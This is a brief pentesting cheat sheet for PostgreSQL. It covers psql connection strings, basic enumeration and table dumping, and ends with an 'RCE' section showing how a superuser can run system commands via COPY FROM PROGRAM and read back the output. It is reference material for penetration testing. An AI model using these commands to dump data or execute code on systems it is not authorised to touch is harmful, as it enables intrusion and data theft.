---
title: "Postgresql"
date: 2025-3-2
tags: ["Database Dumping", "Privilege Escalation In Databases", "Postgresql", "RCE", "Database"]
---

### Connect

```console
psql -h <TARGET> -U <USER>
```

```console
psql -h <TARGET> -U <USER> -p <PORT> -d <DB_NAME>
```

```console
psql 'postgresql://<USER>:<PASSWORD>@localhost:5432/<DB_NAME>'
```

### Basic

```console
# Show Databases
\list
```

```console
# Use Database
\connect <DB_NAME>
```

```console
# Show Tables
\dt
```

```console
# Dump from Table
select * from "<TABLE_NAME>";
```

```console
# Insert into Table
insert into "<TABLE_NAME>" (<COLUMN_1>, <COLUMN_2>) values ("<VALUE_1>', '<VALUE_2>');
```

```console
# Write Text
copy (select '<STRING>') to '<TARGET_PATH>';
```

```console
# List All User Accounts
\du+
```

```console
# Exit
\q
```

<br>

---

### RCE

```console
# Only for Superuser
CREATE TABLE IF NOT EXISTS exec(string text);
```

```console
# Code Execution
COPY exec FROM PROGRAM '<CMD>';
```

```console
# Check Ouput
SELECT * FROM exec;
```